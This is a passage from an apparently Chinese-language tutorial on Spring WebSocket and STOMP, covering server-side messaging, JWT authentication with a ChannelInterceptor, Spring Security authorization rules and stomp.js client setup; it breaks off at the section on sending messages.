<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Service</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">NotificationService</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> SimpMessagingTemplate messagingTemplate;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">NotificationService</span><span class="params">(SimpMessagingTemplate messagingTemplate)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.messagingTemplate = messagingTemplate;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 场景1：由一个 HTTP 请求触发 WebSocket 广播</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">notifyAllUsers</span><span class="params">(String notification)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Broadcasting notification: &quot;</span> + notification);</span><br><span class="line">        <span class="comment">// 向 /topic/notifications 广播消息</span></span><br><span class="line">        messagingTemplate.convertAndSend(<span class="string">&quot;/topic/notifications&quot;</span>, notification);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 场景2：发送私信给特定用户</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">sendPrivateNotification</span><span class="params">(String userId, String message)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Sending private message to &quot;</span> + userId);</span><br><span class="line">        <span class="comment">// 向 /user/&#123;userId&#125;/queue/private 发送消息</span></span><br><span class="line">        messagingTemplate.convertAndSendToUser(userId, <span class="string">&quot;/queue/private&quot;</span>, message);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 场景3：定时任务，每5秒广播一次服务器时间</span></span><br><span class="line">    <span class="meta">@Scheduled(fixedRate = 5000)</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">broadcastServerTime</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">time</span> <span class="operator">=</span> <span class="string">&quot;Server time is: &quot;</span> + <span class="keyword">new</span> <span class="title class_">java</span>.util.Date();</span><br><span class="line">        messagingTemplate.convertAndSend(<span class="string">&quot;/topic/time&quot;</span>, time);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h4 id="3-2-4-消息订阅：-SubscribeMapping-特殊用途"><a href="#3-2-4-消息订阅：-SubscribeMapping-特殊用途" class="headerlink" title="3.2.4 消息订阅：@SubscribeMapping (特殊用途)"></a>3.2.4 消息订阅：<code>@SubscribeMapping</code> (特殊用途)</h4><ul>
<li><p><strong>作用</strong>: 这个注解很容易被误解。它<strong>不是</strong>用来处理所有订阅的通用钩子。它的特定用途是：当一个客户端<strong>首次订阅</strong>某个目的地时，触发该方法，并<strong>立即</strong>将返回值作为一条消息<strong>只</strong>发送给这个订阅者。</p>
</li>
<li><p><strong>工作原理</strong>:</p>
<ol>
<li>客户端 <code>SUBSCRIBE</code> 一个以 <code>/app</code> 开头的目的地，例如 <code>/app/initial-users</code>。</li>
<li>Spring 找到 <code>@SubscribeMapping(&quot;/initial-users&quot;)</code> 方法，并执行它。</li>
<li>方法的返回值会直接发送给刚刚订阅的客户端，其行为类似于 <code>@SendToUser</code>。</li>
</ol>
</li>
<li><p><strong>典型场景</strong>: 当用户加入聊天室时，立即给他发送当前的在线用户列表。</p>
</li>
<li><p><strong>示例代码</strong>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 当客户端订阅 &quot;/app/online-users&quot; 时，立即向其返回在线用户列表</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 返回值将只发送给发起订阅的客户端</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@SubscribeMapping(&quot;/online-users&quot;)</span></span><br><span class="line"><span class="keyword">public</span> List&lt;String&gt; <span class="title function_">getOnlineUsers</span><span class="params">()</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;Client subscribed for online users, sending initial list.&quot;</span>);</span><br><span class="line">    <span class="comment">// 在实际应用中，这里应该从一个服务中获取真实的在线用户列表</span></span><br><span class="line">    <span class="keyword">return</span> List.of(<span class="string">&quot;Alice&quot;</span>, <span class="string">&quot;Bob&quot;</span>, <span class="string">&quot;Charlie&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>客户端交互</strong>: 客户端执行 <code>stompClient.subscribe(&#39;/app/online-users&#39;, callback);</code>，<code>callback</code> 会立即被调用一次，并收到 <code>[&quot;Alice&quot;, &quot;Bob&quot;, &quot;Charlie&quot;]</code>。</p>
</li>
</ul>
<hr>
<h2 id="4-安全与拦截"><a href="#4-安全与拦截" class="headerlink" title="4. 安全与拦截"></a>4. 安全与拦截</h2><p>默认情况下，任何人都可以连接到你的 WebSocket 端点并订阅任何主题，这在生产环境中是极其危险的。我们需要一套机制来确保只有经过身份验证的用户才能连接，并且他们只能收发自己有权限的消息。</p>
<h3 id="4-1-ChannelInterceptor：消息管道的“守卫”"><a href="#4-1-ChannelInterceptor：消息管道的“守卫”" class="headerlink" title="4.1 ChannelInterceptor：消息管道的“守卫”"></a>4.1 <code>ChannelInterceptor</code>：消息管道的“守卫”</h3><p><code>ChannelInterceptor</code> 是 Spring Messaging 提供的一个强大拦截器接口，它允许你在消息被发送或接收的各个阶段插入自定义逻辑。它就像是消息流经的管道上的一个个阀门和检查点。</p>
<ul>
<li><strong>核心作用</strong>：<ul>
<li><strong>认证 (Authentication)</strong>：在连接建立后，从消息头中提取令牌（如 JWT），验证用户身份，并将其与 WebSocket <code>Session</code> 关联起来。</li>
<li><strong>授权 (Authorization)</strong>：在处理 <code>SUBSCRIBE</code> 或 <code>SEND</code> 命令时，检查用户是否有权订阅该目的地或向该目的地发送消息。</li>
<li><strong>日志记录</strong>：记录所有进出的消息，用于调试和审计。</li>
<li><strong>消息修改</strong>：在消息发送前修改其内容或头部信息。</li>
</ul>
</li>
<li><strong>关键方法</strong>：<ul>
<li><code>preSend(Message&lt;?&gt; message, MessageChannel channel)</code>: 在消息发送到 Channel <strong>之前</strong>被调用。这是最常用的方法，用于认证和授权。如果返回 <code>null</code>，则消息处理流程会中止。</li>
<li><code>postSend(Message&lt;?&gt; message, MessageChannel channel, boolean sent)</code>: 在消息发送<strong>之后</strong>被调用，无论成功与否。</li>
<li><code>afterSendCompletion(...)</code>: 在消息发送<strong>完成</strong>后（包括所有事务提交）被调用。</li>
</ul>
</li>
<li><strong>配置方式</strong>：<br><code>ChannelInterceptor</code> 需要注册到 <code>clientInboundChannel</code> (处理客户端发来消息的通道) 或 <code>clientOutboundChannel</code> (处理发往客户端消息的通道) 上。</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在 WebSocketConfig.java 中</span></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="meta">@EnableWebSocketMessageBroker</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebSocketConfig</span> <span class="keyword">implements</span> <span class="title class_">WebSocketMessageBrokerConfigurer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ... 其他配置</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">configureClientInboundChannel</span><span class="params">(ChannelRegistration registration)</span> &#123;</span><br><span class="line">        registration.interceptors(<span class="keyword">new</span> <span class="title class_">MyChannelInterceptor</span>());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p><strong>示例：使用拦截器进行 JWT 认证</strong></p>
<p>这是一个典型的认证场景：客户端在 STOMP 连接的 <code>CONNECT</code> 帧的 header 中携带 JWT。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JwtChannelInterceptor</span> <span class="keyword">implements</span> <span class="title class_">ChannelInterceptor</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Message&lt;?&gt; preSend(Message&lt;?&gt; message, MessageChannel channel) &#123;</span><br><span class="line">        <span class="type">StompHeaderAccessor</span> <span class="variable">accessor</span> <span class="operator">=</span> MessageHeaderAccessor.getAccessor(message, StompHeaderAccessor.class);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 1. 判断是否为 CONNECT 命令，如果是，则进行认证</span></span><br><span class="line">        <span class="keyword">if</span> (StompCommand.CONNECT.equals(accessor.getCommand())) &#123;</span><br><span class="line">            <span class="comment">// 2. 从 header 中获取 token</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">jwtToken</span> <span class="operator">=</span> accessor.getFirstNativeHeader(<span class="string">&quot;Authorization&quot;</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (jwtToken != <span class="literal">null</span> &amp;&amp; jwtToken.startsWith(<span class="string">&quot;Bearer &quot;</span>)) &#123;</span><br><span class="line">                jwtToken = jwtToken.substring(<span class="number">7</span>);</span><br><span class="line">                </span><br><span class="line">                <span class="comment">// 3. 使用 JWT 工具类或 Spring Security 进行 token 验证</span></span><br><span class="line">                <span class="comment">//    如果验证成功，会返回一个 Authentication 对象</span></span><br><span class="line">                <span class="type">Authentication</span> <span class="variable">userAuth</span> <span class="operator">=</span> JwtUtil.getAuthentication(jwtToken);</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span> (userAuth != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="comment">// 4. 将认证信息设置到 STOMP 的 session 中</span></span><br><span class="line">                    <span class="comment">//    这样在后续的 @MessageMapping 方法中，就可以通过 Principal 参数获取到用户信息</span></span><br><span class="line">                    accessor.setUser(userAuth);</span><br><span class="line">                    <span class="keyword">return</span> message;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 5. 如果认证失败，可以抛出异常，连接将被拒绝</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SecurityException</span>(<span class="string">&quot;Authentication failed!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 对于非 CONNECT 命令，直接放行（后续可以结合 Spring Security 做更细粒度的授权）</span></span><br><span class="line">        <span class="keyword">return</span> message;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>客户端配合 (stomp.js)</strong>:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> jwtToken = <span class="string">&#x27;your-jwt-token&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> headers = &#123;</span><br><span class="line">  <span class="string">&#x27;Authorization&#x27;</span>: <span class="string">`Bearer <span class="subst">$&#123;jwtToken&#125;</span>`</span></span><br><span class="line">&#125;;</span><br><span class="line">stompClient.<span class="title function_">connect</span>(headers, onConnected, onError);</span><br></pre></td></tr></table></figure></li>
</ul>
<hr>
<h3 id="4-2-结合-Spring-Security：实现声明式安全"><a href="#4-2-结合-Spring-Security：实现声明式安全" class="headerlink" title="4.2 结合 Spring Security：实现声明式安全"></a>4.2 结合 Spring Security：实现声明式安全</h3><p>虽然 <code>ChannelInterceptor</code> 功能强大，但对于复杂的授权规则（例如，只有 “ADMIN” 角色的用户才能订阅 <code>/topic/admin</code>），手动编写 <code>if-else</code> 逻辑会变得非常繁琐。Spring Security 提供了与 WebSocket 的深度集成，让我们能够以<strong>声明式</strong>的方式配置安全规则。</p>
<ul>
<li><p><strong>核心思想</strong>：将 WebSocket 的消息类型（CONNECT, SUBSCRIBE, MESSAGE, SEND）类比于 HTTP 的方法（GET, POST），将消息目的地（Destination）类比于 HTTP 的 URL。这样，我们就可以用与保护 Web 端点类似的方式来保护 WebSocket 消息。</p>
</li>
<li><p><strong>配置步骤</strong>：</p>
<ol>
<li><p><strong>添加依赖</strong>: 确保项目中包含 <code>spring-boot-starter-security</code> 和 <code>spring-security-messaging</code>。</p>
</li>
<li><p><strong>创建安全配置类</strong>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.config.annotation.web.socket.AbstractSecurityWebSocketMessageBrokerConfigurer;</span><br><span class="line"><span class="keyword">import</span> org.springframework.security.config.annotation.web.messaging.MessageSecurityMetadataSourceRegistry;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WebSocketSecurityConfig</span> <span class="keyword">extends</span> <span class="title class_">AbstractSecurityWebSocketMessageBrokerConfigurer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 配置消息的安全规则</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">configureInbound</span><span class="params">(MessageSecurityMetadataSourceRegistry messages)</span> &#123;</span><br><span class="line">        messages</span><br><span class="line">            <span class="comment">// 1. 所有目的地以 /app/admin/ 开头的消息，需要 ADMIN 角色</span></span><br><span class="line">            .simpDestMatchers(<span class="string">&quot;/app/admin/**&quot;</span>).hasRole(<span class="string">&quot;ADMIN&quot;</span>)</span><br><span class="line">            <span class="comment">// 2. 所有目的地以 /user/ 开头的消息（通常是私信），要求用户已认证</span></span><br><span class="line">            .simpDestMatchers(<span class="string">&quot;/user/**&quot;</span>).authenticated()</span><br><span class="line">            <span class="comment">// 3. 订阅 /topic/private 主题，需要 &quot;SPECIAL_USER&quot; 权限</span></span><br><span class="line">            .simpSubscribeDestMatchers(<span class="string">&quot;/topic/private&quot;</span>).hasAuthority(<span class="string">&quot;SPECIAL_USER&quot;</span>)</span><br><span class="line">            <span class="comment">// 4. 对其他所有消息（如公共聊天室），允许所有访问</span></span><br><span class="line">            .anyMessage().permitAll();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 禁用 CSRF token 验证 for WebSocket</span></span><br><span class="line"><span class="comment">     * 在现代 JWT/Token-based 认证中，CSRF 保护通常是不必要的，</span></span><br><span class="line"><span class="comment">     * 因为客户端不会在 cookie 中自动发送凭证。</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="type">boolean</span> <span class="title function_">sameOriginDisabled</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
<li><p><strong>关键点解释</strong>：</p>
<ul>
<li><code>AbstractSecurityWebSocketMessageBrokerConfigurer</code>: 这是配置 WebSocket 安全的专用基类。</li>
<li><code>configureInbound()</code>: 这是配置入口，用于定义对<strong>入站消息</strong>（来自客户端）的安全约束。</li>
<li><code>simpDestMatchers()</code>: 匹配消息的目的地（Destination）。适用于 <code>MESSAGE</code> 和 <code>SEND</code> 类型的消息。</li>
<li><code>simpSubscribeDestMatchers()</code>: 专门匹配 <code>SUBSCRIBE</code> 类型的消息。</li>
<li><code>simpTypeMatchers()</code>: 可以匹配消息的类型，如 <code>CONNECT</code>, <code>DISCONNECT</code>。例如，<code>.simpTypeMatchers(SimpMessageType.CONNECT).permitAll()</code> 允许所有连接。</li>
<li><code>.authenticated()</code>: 要求用户必须已登录。</li>
<li><code>.hasRole(&quot;ADMIN&quot;)</code> &#x2F; <code>.hasAuthority(&quot;WRITE&quot;)</code>: 要求用户拥有指定的角色或权限。</li>
<li><code>sameOriginDisabled()</code>: 返回 <code>true</code> 以禁用 Spring Security 的同源策略保护。对于非浏览器的 WebSocket 客户端或需要跨域的场景，这通常是必需的。</li>
</ul>
</li>
<li><p><strong>认证如何进行？</strong><br>Spring Security 的 WebSocket 集成<strong>重用了 Web 层的认证机制</strong>。这意味着：</p>
<ol>
<li>如果你的应用使用 Session + Cookie，当 WebSocket 握手时，HTTP 请求中携带的 Cookie 会被用来识别用户身份。</li>
<li>如果你的应用使用 JWT，你需要像前面 <code>ChannelInterceptor</code> 示例那样，在握手阶段或第一个 STOMP <code>CONNECT</code> 帧中验证 JWT，并将 <code>Authentication</code> 对象与会话关联。一旦关联成功，Spring Security 的授权规则就能自动生效。</li>
</ol>
</li>
</ul>
<hr>
<h3 id="4-3-总结"><a href="#4-3-总结" class="headerlink" title="4.3 总结"></a>4.3 总结</h3><p>在实际项目中，<code>ChannelInterceptor</code> 和 Spring Security 通常结合使用：</p>
<ol>
<li><strong>使用 <code>ChannelInterceptor</code></strong>：<ul>
<li>在 STOMP <code>CONNECT</code> 阶段，从 header 中解析 Token (如 JWT)。</li>
<li>验证 Token 并构建 <code>Authentication</code> 对象。</li>
<li>通过 <code>StompHeaderAccessor.setUser()</code> 将 <code>Authentication</code> 对象关联到当前会话。</li>
</ul>
</li>
<li><strong>使用 <code>WebSocketSecurityConfig</code></strong>：<ul>
<li>利用 Spring Security 声明式的强大能力，轻松配置各种目的地的访问控制规则 (<code>hasRole</code>, <code>authenticated</code> 等)。</li>
<li>这些规则会自动作用于第一步中已认证的用户。</li>
</ul>
</li>
</ol>
<hr>
<h2 id="5-客户端交互（简述）"><a href="#5-客户端交互（简述）" class="headerlink" title="5. 客户端交互（简述）"></a>5. 客户端交互（简述）</h2><p>后端搭建了强大的 STOMP 服务，但其价值最终需要通过客户端的交互来体现。对于 Web 前端，最流行和健壮的组合是使用 <code>SockJS</code> 作为底层传输，<code>stomp.js</code> (或其现代变体 <code>@stomp/stompjs</code>) 作为上层协议库。</p>
<ul>
<li><strong>SockJS</strong>: 一个浏览器 JavaScript 库，它提供了一个类似 WebSocket 的对象。其核心价值在于<strong>兼容性</strong>：如果浏览器不支持原生 WebSocket，它会自动降级 (fallback) 到其他可用的双向通信技术，如 HTTP Long Polling。这确保了你的应用在老旧浏览器或特殊网络环境下依然可以工作。</li>
<li><strong>stomp.js</strong>: 一个实现了 STOMP 协议的 JavaScript 客户端库。它负责将你的业务操作（如“订阅&#x2F;topic&#x2F;news”）封装成标准格式的 STOMP 帧，并通过底层的 WebSocket 或 SockJS 连接发送出去。</li>
</ul>
<p><strong>1. 引入库</strong></p>
<p>通常通过 CDN 或 npm&#x2F;yarn 包管理器引入。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 通过 CDN --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/sockjs-client@1/dist/sockjs.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://cdn.jsdelivr.net/npm/@stomp/stompjs@7/bundles/stomp.umd.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>2. 建立连接 (<code>CONNECT</code>)</strong></p>
<p>这是所有交互的起点。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. 创建一个 StompJs 客户端实例</span></span><br><span class="line"><span class="keyword">const</span> stompClient = <span class="keyword">new</span> <span class="title class_">StompJs</span>.<span class="title class_">Client</span>(&#123;</span><br><span class="line">    <span class="comment">// 2. 底层传输配置：使用 SockJS</span></span><br><span class="line">    <span class="comment">//    这里的 URL &#x27;/ws-stomp&#x27; 必须与后端 `registerStompEndpoints` 中配置的端点一致</span></span><br><span class="line">    <span class="attr">webSocketFactory</span>: <span class="function">() =&gt;</span> <span class="keyword">new</span> <span class="title class_">SockJS</span>(<span class="string">&#x27;http://localhost:8080/ws-stomp&#x27;</span>),</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// (可选) 连接成功时的回调函数</span></span><br><span class="line">    <span class="attr">onConnect</span>: <span class="function">(<span class="params">frame</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Connected: &#x27;</span> + frame);</span><br><span class="line">        <span class="comment">// 连接成功后，通常在这里进行订阅</span></span><br><span class="line">        <span class="title function_">subscribeToTopics</span>(); </span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="comment">// (可选) 连接失败时的回调函数</span></span><br><span class="line">    <span class="attr">onStompError</span>: <span class="function">(<span class="params">frame</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Broker reported error: &#x27;</span> + frame.<span class="property">headers</span>[<span class="string">&#x27;message&#x27;</span>]);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;Additional details: &#x27;</span> + frame.<span class="property">body</span>);</span><br><span class="line">    &#125;,</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// (可选) 用于调试，打印所有 STOMP 帧</span></span><br><span class="line">    <span class="attr">debug</span>: <span class="function">(<span class="params">str</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="keyword">new</span> <span class="title class_">Date</span>(), str);</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    <span class="comment">// (可选) 如果需要携带认证信息（如JWT），在 connectHeaders 中设置</span></span><br><span class="line">    <span class="attr">connectHeaders</span>: &#123;</span><br><span class="line">        <span class="string">&#x27;Authorization&#x27;</span>: <span class="string">&#x27;Bearer your-jwt-token&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. 激活连接</span></span><br><span class="line">stompClient.<span class="title function_">activate</span>();</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>关键点</strong>:<ul>
<li><code>webSocketFactory</code>: 指定了底层的传输方式。这里我们使用 SockJS，它会首先尝试 WebSocket，失败则降级。</li>
<li><code>onConnect</code>: 连接成功的回调至关重要，后续的订阅和发送操作都应该在连接成功后进行。</li>
<li><code>connectHeaders</code>: 这是向后端传递认证令牌（如 JWT）的标准方式，对应后端 <code>ChannelInterceptor</code> 中的 <code>accessor.getFirstNativeHeader(&quot;Authorization&quot;)</code>。</li>
</ul>
</li>
</ul>
<p><strong>3. 订阅目的地 (<code>SUBSCRIBE</code>)</strong></p>
<p>订阅一个“频道”，以便接收来自该频道的广播消息。</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">subscribeToTopics</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// 订阅公共聊天室主题</span></span><br><span class="line">    stompClient.<span class="title function_">subscribe</span>(<span class="string">&#x27;/topic/public&#x27;</span>, <span class="function">(<span class="params">message</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="comment">// 当收到消息时，此回调函数被触发</span></span><br><span class="line">        <span class="comment">// message.body 通常是一个 JSON 字符串</span></span><br><span class="line">        <span class="keyword">const</span> chatMessage = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(message.<span class="property">body</span>);</span><br><span class="line">        <span class="title function_">showGreeting</span>(chatMessage.<span class="property">from</span> + <span class="string">&quot;: &quot;</span> + chatMessage.<span class="property">text</span>);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 订阅一个用户私有队列，用于接收私信或个人通知</span></span><br><span class="line">    <span class="comment">// stomp.js 会自动处理 /user 前缀</span></span><br><span class="line">    stompClient.<span class="title function_">subscribe</span>(<span class="string">&#x27;/user/queue/replies&#x27;</span>, <span class="function">(<span class="params">message</span>) =&gt;</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Received private message: &#x27;</span>, message.<span class="property">body</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><strong>关键点</strong>:<ul>
<li><code>stompClient.subscribe(destination, callback)</code>: 第一个参数是 STOMP 目的地，与后端 <code>@SendTo</code> 或 <code>SimpMessagingTemplate</code> 的目标地址对应。第二个参数是收到消息后的处理函数。</li>
<li>订阅 <code>/user/...</code> 格式的目的地时，库会自动将其映射到与当前用户会话相关的唯一地址。</li>
</ul>
</li>
</ul>
<p><strong>4. 发送消息 (<code>SEND</code>)</strong></p>
<p>向一个目的地发送消息，通常由用户操作触发（如点击“发送”按钮）。</p>
